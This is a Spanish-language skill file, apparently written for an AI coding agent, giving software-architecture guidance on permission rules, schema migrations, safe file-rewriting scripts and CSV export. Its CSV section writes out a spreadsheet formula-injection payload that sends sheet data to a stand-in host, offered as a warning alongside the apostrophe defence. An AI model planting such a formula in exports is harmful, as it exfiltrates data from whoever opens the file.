---
name: arquitecto-software
description: "Piensa como ARQUITECTO DE SOFTWARE ANTES de escribir o corregir código en webs y apps. Aplica en CUALQUIER trabajo de código no trivial: implementar una feature, corregir un bug con consecuencias, refactorizar, diseñar un módulo o un esquema de datos, decidir cómo se conecta / escala / asegura / integra el sistema. Un buen arquitecto no escribe más código: toma mejores decisiones, pensando en el SISTEMA COMPLETO (negocio, escala a miles de usuarios, seguridad por diseño, costo, mantenibilidad, integración), no en una sola función. GATILLOS: 'implementa', 'construye', 'crea', 'corrige', 'arregla', 'refactoriza', 'optimiza', 'agrega una feature/módulo', 'diseña el esquema/la estructura', 'cómo conecto/escalo/aseguro/integro X', cualquier decisión técnica o de arquitectura. Úsala ANTES de tocar código en tareas con consecuencias de diseño. NO para edits triviales (un texto, un color, un typo) ni tareas que no son de código."
actualizada: 2026-09-02
reglas: 24
lecciones: []
origen: propia
---

# 🏛️ Arquitecto de Software — decide antes de codear

> El código hace que funcione; **la arquitectura hace que sobreviva.** *Un buen arquitecto no escribe
> más código: toma mejores decisiones.* **Piensa en el sistema completo, no en una sola función.**
> *La mejor arquitectura no es la más compleja: es la que genera más valor con menos fricción.*

## Cuándo aplica
ANTES de cualquier trabajo de código NO trivial: implementar, corregir, refactorizar, agregar un
módulo/feature, diseñar un esquema de datos, o decidir cómo se conecta/escala/asegura/integra algo.
Para edits triviales (un texto, un color, un typo) NO hace falta — sería fricción inútil.

## Las 6 lentes — decide CADA cambio por su impacto en:
1. **Negocio** — ¿qué problema real resuelve y qué impacto tiene? Entiéndelo antes de codear.
2. **Escala (miles de usuarios)** — diseña hoy para el crecimiento de mañana: desacoplar, paginar,
   cachear, evitar cuellos de botella. *Escalar no es "más servidores": es diseñar para crecer sin romperse.*
3. **Seguridad por diseño (desde el inicio, NO al final)** — autenticación · autorización (RBAC
   least-privilege) · datos cifrados en tránsito/reposo · validación server-side · secretos fuera del
   código · monitoreo/auditoría. *Un sistema seguro no es más complejo: es más confiable y resiliente.*
4. **Costo** — toda decisión tiene impacto técnico-financiero (infra · rendimiento · mantenibilidad ·
   equipo · escala). *No se trata de gastar menos, sino de invertir mejor.* "Una mala arquitectura se
   siente en el código, se paga en el servidor y la sufre el negocio."
5. **Mantenibilidad** — módulos limpios, desacoplados, fáciles de evolucionar. **Cero monolitos:**
   límites claros, despliegues independientes, bajo acoplamiento.
6. **Integración** — define CÓMO colaboran los servicios, no solo que funcionen. Patrones y **cuándo
   cada uno**: **REST/HTTP** (request-response, el default) · **GraphQL** (el cliente arma su consulta;
   muchas vistas/campos) · **eventos** (desacoplar productor/consumidor) · **colas/mensajería** (trabajo
   pesado/diferido) · **webhooks** (servicios externos: pago, DIAN) · **gRPC** (alto rendimiento entre
   microservicios — solo si el contexto lo justifica). Elegir por **acoplamiento + latencia + costo**, no por moda.

## UX / Arquitectura de Información TAMBIÉN es arquitectura
El panel/producto se diseña **segmentado y ordenado** (jerarquía clara, estados explícitos,
filtros/orden) como un sistema profesional que escala a más módulos — NO features sueltas en un menú plano.

## Procedimiento
1. **Diseña antes de codear.** Para trabajo no trivial, haz un **Impact Analysis** breve (5 puntos):
   (A) archivos a modificar · (B) archivos que quedan INTACTOS (verificado) · (C) código muerto ·
   (D) alcance del refactor · (E) riesgos + rollback + tests.
2. **Decide por las 6 lentes** y **di explícitamente** la decisión de arquitectura + su porqué (qué
   ejes pesaron) antes o junto al código.
3. **Contexto manda — no cargo-cult.** Elige lo que da más valor con menos fricción/costo para ESTE
   sistema. En serverless/free-tier (p.ej. Firebase) la escala horizontal la da la plataforma → NO
   metas microservicios/gRPC/Kubernetes por moda.
4. **Decisión cara de revertir** (arquitectura, modelo de datos, seguridad, integración de pago) = es
   Decisión Fuerte → **Comité ×3** + 2ª opinión externa, y registra el porqué (ADR).

## En tu proyecto activo (consulta el cerebro del repo — NO rutas fijas)
> Skill PORTABLE: funciona en cualquier proyecto. NO hardcodear rutas/§ de un repo (contaminaría a los demás).
- Lee el resumen always-on de arquitectura del `CLAUDE.md` del proyecto activo (sección de doctrinas) + su IAP.
- Si el proyecto tiene una neurona de arquitectura (north-star/charter) o de escalabilidad, léela ANTES
  de moldear un módulo o una fase: **barrido holístico del sistema completo, no la pieza aislada**.
- Seguridad y mapa de código: consulta los lóbulos/neuronas del proyecto vía su `00-INDICE` / `40-LOBULOS-DOMINIO`.

## Modelos de permiso en backends con reglas declarativas (Firebase, Supabase RLS, S3)

Elegir cómo una regla sabe «quién eres» parece una decisión de estilo y es de coste, de alcance y de
tiempo de revocación. Tres cosas que casi nadie mira antes de decidir, y que deciden por ti:

1. **Una regla que hace `get()` SE FACTURA aunque deniegue.** No es un detalle: si tu app deja
   autenticarse a cualquiera —un login social para clientes, por ejemplo— entonces «estar autenticado»
   no es un estado raro, es el estado por defecto de un desconocido. Un bucle desde la consola del
   navegador dispara esa lectura por petición y te vacía la cuota diaria sin conseguir un solo dato.
   Un **claim dentro del token cuesta cero**: viaja firmado y la regla lo lee sin salir a ninguna parte.
2. **Comprueba que el mecanismo alcance a TODAS las mitades.** Las reglas de almacenamiento de archivos
   normalmente **no pueden consultar la base de datos**. Si eliges «la regla mira un documento», acabas
   de dejar fuera el bucket donde viven los documentos escaneados y los adjuntos privados — que suele
   ser lo más sensible que tienes. Un claim sí llega a los dos sitios.
3. **Un token ya emitido no se puede matar.** Revocar refresh tokens, deshabilitar o incluso borrar la
   cuenta impiden RENOVAR, no invalidan lo que ya se entregó: hay hasta una hora de acceso residual. Si
   lo que proteges es LECTURA de datos sensibles, di el número en voz alta y escribe el procedimiento
   de urgencia (desplegar a mano una regla más estricta). «Total, no puede escribir» no es una
   respuesta cuando el activo es la información.

**El patrón que resuelve los tres**: el **documento manda, el token es su espejo**. Una colección de
usuarios es la fuente de verdad —tiene listado, autoría, interfaz y responde «¿quién tiene acceso
hoy?»—, y un trigger deriva de ella el claim. Nadie escribe el claim a mano nunca.

**Y al implementar ese trigger, cuatro cosas que solo aparecen intentando romperlo:**
- **Relee el documento**, no uses el payload del evento: los triggers son *at-least-once* y sin orden
  garantizado, así que un reintento viejo que llegue después de una revocación deja el permiso pegado
  en «concedido».
- **Revoca antes de cualquier corte por idempotencia**: si en una pasada el permiso se escribió y la
  revocación falló, el reintento sale por el early-return y no revoca jamás.
- **Lista blanca, no lista negra**: exige `activo === true`, no `!== false`. Un `"false"` tecleado como
  TEXTO en una consola de administración no puede concederle acceso a nadie.
- **El barrido de huérfanos lleva fusible**: solo corre si el censo salió COMPLETO. Un censo parcial
  —porque una página falló o porque el listado miente en silencio por encima de su tope— jamás puede
  interpretarse como «revócaselo a todos».

**Despliégalo SOLO**, separado del cambio grande que lo motivó. Si no toca las reglas vivas, no puede
romper nada, y el permiso queda verificado en producción semanas antes de que alguien dependa de él.

## Dos escritores sobre el mismo almacén (migraciones y sistemas que conviven)

Casi ninguna sustitución de sistema es un salto: hay un periodo —meses— en el que el viejo y el nuevo
comparten la base de datos. Es la fase donde más barato es equivocarse y más caro es enterarse tarde.

**1. En una base sin esquema, el cast es una promesa que nadie comprueba.** `doc.data() as Modelo`
(o su equivalente en cualquier lenguaje con tipos borrados en runtime) compila perfectamente sobre un
documento del modelo viejo. El resultado no es una excepción: es que el documento **pasa los filtros**
—porque los campos del filtro sí coinciden— y falla más abajo, al leer lo que en su modelo vive en otro
sitio. Síntoma típico: **lista vacía, cero errores, cero logs.** Valida la FORMA en la frontera de
lectura; el cast solo silencia al compilador.

**2. El desajuste de esquema merece su PROPIO motivo de descarte.** Si lo dejas caer en un cubo que ya
existe («sin precio», «sin imagen»), el sistema te da un diagnóstico **falso**: manda a buscar un
precio que sí está, solo que en otra forma. El motivo ES el diagnóstico — la diferencia entre una
respuesta en un minuto y una tarde de depuración el día del lanzamiento.

**3. Detecta por lo que el modelo CIERRA, no por heurísticas.** Enumeraciones (¿está el valor en la
lista?) y tipo de un campo (¿objeto o escalar?) son verificaciones exactas y baratas. «Parece viejo
porque le falta X» envejece mal. Y basta UNA señal para descartar: una migración a medias es tan
inservible como ninguna.

**4. Los descartes se cuentan POR MOTIVO, nunca en total.** «5 omitidas» no responde ninguna pregunta;
`{ "esquema-legacy": 5 }` responde la única que importa. Y guárdalo donde se pueda mirar sin abrir la
consola de logs.

**5. El guardián va en TODOS los lectores, no solo en el que descubriste.** Un almacén compartido suele
tener varias puertas —el listado, la búsqueda por id, un export— y solo una de ellas filtra. La que se
salta el filtro es justo la que sirve contenido de aspecto correcto. Reutiliza el MISMO predicado en
todas: dos lectores que discrepan sobre qué es válido es el bug siguiente.

**6. Adaptar o migrar es una cuestión de VOLUMEN, no de elegancia.** Una capa que traduce el modelo
viejo al nuevo es correcta ante un corpus grande o un escritor viejo que no puedes apagar. Ante un
puñado de registros es sostener dos esquemas para siempre a cambio de ahorrar unas altas a mano —
**escribe la herramienta nueva y migra**. Y hasta que exista esa herramienta, di en voz alta que el
sistema nuevo **no tiene forma de crear datos**: es un requisito del lanzamiento disfrazado de mejora.

**7. El ESCRITOR valida llamando al LECTOR, y el test va en las dos direcciones.** El corolario del
punto 5, del otro lado del almacén: si un formulario decide por su cuenta qué es válido, tarde o
temprano acepta algo que el lector descarta —y el usuario se queda mirando una lista vacía sin ningún
error—. La defensa no es «acordarse de validar igual»: es que el escritor **invoque** los predicados
del lector en vez de reproducir sus condiciones, aunque sean cuatro líneas. Copiarlas ES el bug.
Cuando el lector solo devuelve el PRIMER fallo (le basta para descartar) pero el formulario los
necesita todos, extrae la lista de condiciones a una función y deja que cada uno tome lo que quiera de
ella. Y fija el contrato con un test **bidireccional**: *lo que el escritor acepta, el lector no lo
descarta* **y** *lo que el lector descarta, el escritor lo había avisado*. Sin la segunda mitad, la
próxima regla que se añada al lector reabre el hueco en silencio.

**8. Un solo parser «listo» para dos dominios es una bomba de relojería.** El mismo carácter significa
cosas distintas según lo que estés leyendo: en un precio de buena parte del mundo (España, Colombia,
Alemania…) el punto separa **miles**, y en una coordenada, un área o una versión el mismo punto es el
**decimal**. Un parser que intente adivinar acertará casi siempre y fallará justo donde duele:
`lat: 10.399` interpretado como miles pone el inmueble en la latitud **10399**, sin lanzar nada.
Escribe una función por dominio —`numeroDeDinero`, `numeroDecimal`— aunque se parezcan, y nómbralas
por lo que leen, no por lo que devuelven. Vale lo mismo para fechas (`03/04` no es el mismo día a los
dos lados del Atlántico) y para husos horarios. **Señal de que estás en esta trampa:** te descubres
escribiendo una heurística con «si tiene tres dígitos después del punto, entonces…».

**9. Un build que TRANSPILA no es un build que COMPRUEBA.** Muchos empaquetadores modernos (esbuild,
Vite, SWC y todo lo construido encima: Astro, Next, Remix) **borran los tipos sin validarlos** —es lo
que los hace rápidos—. El efecto es que un proyecto escrito íntegramente en TypeScript puede no tener
NINGUNA verificación de tipos, y la ausencia no se nota: todo compila, todo arranca, y un import roto o
una firma cambiada llegan a producción sin un aviso. **Comprueba ahora mismo si tu proyecto tiene un
paso de tipos DISTINTO del build** —`tsc --noEmit`, `astro check`, `vue-tsc`— y si no lo tiene,
añádelo y **cablealo al CI antes del build**; en `package.json` solo, no protege nada. Cuando lo
enciendas por primera vez espera errores viejos: aparecerán todos los que llevaban tiempo dentro, y
alguno tendrá meses. **Vale igual para lo que el build tampoco mira**: linters, tamaño del bundle,
accesibilidad. La pregunta útil no es «¿pasa el build?» sino **«¿qué NO comprueba el build?»**.

## Scripts que reescriben archivos (el modo más silencioso de perder trabajo)

Un script de mantenimiento que edita ficheros del propio proyecto es código de producción con
permisos de borrado, aunque viva en un temporal y se ejecute una sola vez.

0. **Esto vale para CUALQUIER forma de reescribir un archivo** — script, one-liner de terminal, comando
   suelto. La primera redacción de esta regla decía «en un script» y su autor la incumplió una hora
   después en un `python -c` de una línea, porque un one-liner no le pareció un script. **Una regla con
   un “salvo los casos pequeños” implícito se rompe justo en los pequeños**, que son los que se escriben
   sin pensar.
1. **LEE A UNA VARIABLE ANTES DE ABRIR EN ESCRITURA.** En muchos lenguajes el receptor de la llamada
   se evalúa antes que sus argumentos, así que `open(p,'w').write(open(p).read() + X)` **trunca el
   archivo** y luego lee el vacío: queda un fichero con solo `X`. No lanza excepción y el script
   imprime «hecho». Así se pierde un historial de 3900 líneas sin un solo error en pantalla.
2. **Afirma sobre el contenido VIEJO antes de escribir** (`assert prev.count('## ') >= 100`). Ese
   assert es lo único que distingue mecánicamente un *append* de un *reemplazo total*.
3. **Commitea antes de correr el script.** Lo que salva no es la pericia: es que `git checkout --`
   pueda devolver el archivo intacto. Si lo que vas a reescribir no está commiteado, comitéalo antes.
4. **Escribe la verificación en el propio script**: cuenta las unidades esperadas (secciones, filas,
   registros) DESPUÉS de escribir y falla si bajaron. El daño lo suele delatar un gate de más abajo —
   si existe; no cuentes con ello.
5. **Y el escalón anterior: no pases el script por el shell.** Un heredoc puede comerse una barra
   invertida o expandir algo entre comillas, y entonces depuras un error que TÚ no escribiste.
   Escribe el script a un archivo y ejecuta el archivo.

## Exportar datos a CSV / Excel (tres trampas, dos de ellas de seguridad)

1. **Inyección de fórmulas (CWE-1236)** — la grave. Excel y Sheets INTERPRETAN un campo que empieza
   por `=`, `+`, `-`, `@`, tabulador o CR. Si el dato viene de un formulario público, cualquiera
   escribe `=HYPERLINK("http://malo/?d="&A1,"Ver")` en el campo «nombre» y eso se ejecuta al abrir el
   export en la máquina de quien lo descarga, con SU sesión: es la vía clásica para exfiltrar una
   hoja entera desde un input de una web. **Antepón un apóstrofo**, no borres el carácter — un
   teléfono `+57 300…` es un dato legítimo que hay que conservar entero.
2. **RFC 4180** — una coma, una comilla o un salto dentro de un campo parten la fila. Entrecomilla y
   duplica la comilla interna. Un mensaje de usuario trae la coma de serie.
3. **BOM** — sin `\uFEFF` al principio, Excel en Windows abre el archivo en la codificación del
   sistema y los acentos salen rotos. No es cosmético si quien lo abre trabaja en Windows.
4. **PII**: si el export lleva datos personales, **dilo en el nombre del archivo**. Nadie debería
   encontrárselo en Descargas sin saber que son personas.
5. Sepáralo en dos módulos: el serializador es **puro** (se prueba en Node, sin navegador) y la
   descarga toca el DOM. Y `revokeObjectURL` después del clic — antes cancela la descarga; nunca, y
   el archivo queda retenido en memoria mientras la pestaña siga abierta.

## Config de gates propios en utillaje COMPARTIDO: usa un prefijo, no la lista común

Cuando varios repos comparten un linter/kernel con un esquema de configuración validado, la config de
un gate que solo existe en UNO de ellos no cabe en ninguna de las dos salidas obvias: meterla en la
lista de claves conocidas contamina a los demás (y esa lista se convierte en un cajón de sastre), y
disfrazarla de comentario (`_clave`) la vuelve invisible para quien lea el archivo buscando qué gates
hay.

**Reserva un prefijo de extensión** —`x-`, como las cabeceras de HTTP— y haz que el validador lo
ignore explícitamente. La clave se declara, se ve, y el validador no finge conocerla. Es la
diferencia entre un punto de extensión y una excepción: el primero se documenta una vez, la segunda
se negocia cada vez.

## Cuándo NO usar
- Edits triviales sin consecuencias de diseño (un texto, un color, un typo).
- Tareas que no son de código (salvo que haya una decisión de sistema detrás).
